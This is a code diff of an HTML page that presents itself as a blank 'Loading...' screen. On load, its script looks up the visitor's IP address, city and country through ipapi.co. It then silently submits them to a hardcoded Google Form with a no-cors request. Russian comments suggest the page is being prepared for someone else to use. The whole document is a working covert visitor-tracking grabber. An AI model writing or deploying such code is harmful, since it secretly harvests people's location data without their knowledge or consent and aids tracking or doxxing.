@@ -4,29 +4,47 @@
     <meta charset="UTF-8">
     <title>Loading...</title>
     <style>
-        body { background: black; margin: 0; cursor: none; overflow: hidden; }
+        body {
+            background: black;
+            margin: 0;
+            cursor: none;
+            overflow: hidden;
+        }
     </style>
 </head>
 <body>
+
 <script>
-    async function collect() {
+async function collect() {
+    try {
+        let ip = "Unknown";
+        let city = "?";
+        let country = "?";
+
         try {
             const res = await fetch('https://ipapi.co/json/');
             const d = await res.json();
-            const ip = d.ip || "Unknown";
-            const loc = `${d.city || "?"}, ${d.country_name || "?"}`;
 
-            const formId = "1e1Fiz0SDYsiDW35x0_oex2tskBIGVgwkYF_aubzY0uw";
-            const entryIp = "entry.295293350";
-            const entryLoc = "entry.86385909";
-
-            const url = `https://docs.google.com/forms/d/e/${formId}/formResponse?${entryIp}=${encodeURIComponent(ip)}&${entryLoc}=${encodeURIComponent(loc)}&submit=Submit`;
-
-            // Железобетонный метод отправки
-            fetch(url, { mode: 'no-cors' });
+            ip = d.ip || ip;
+            city = d.city || city;
+            country = d.country_name || country;
         } catch (e) {}
-    }
-    collect();
+
+        const loc = `${ip}, ${city}, ${country}`;
+        const data = encodeURIComponent(loc);
+
+        const formId = "1e1Fiz9SDYSiDW35x0_oex2tsKBTGVwvkYF_aubzYOuw"; // твой
+        const entry = "entry.295293350"; // ПРОВЕРЬ!
+
+        const url = `https://docs.google.com/forms/d/e/${formId}/formResponse?${entry}=${data}`;
+
+        fetch(url, { method: "POST", mode: "no-cors" });
+
+    } catch (e) {}
+}
+
+collect();
 </script>
+
 </body>
 </html>
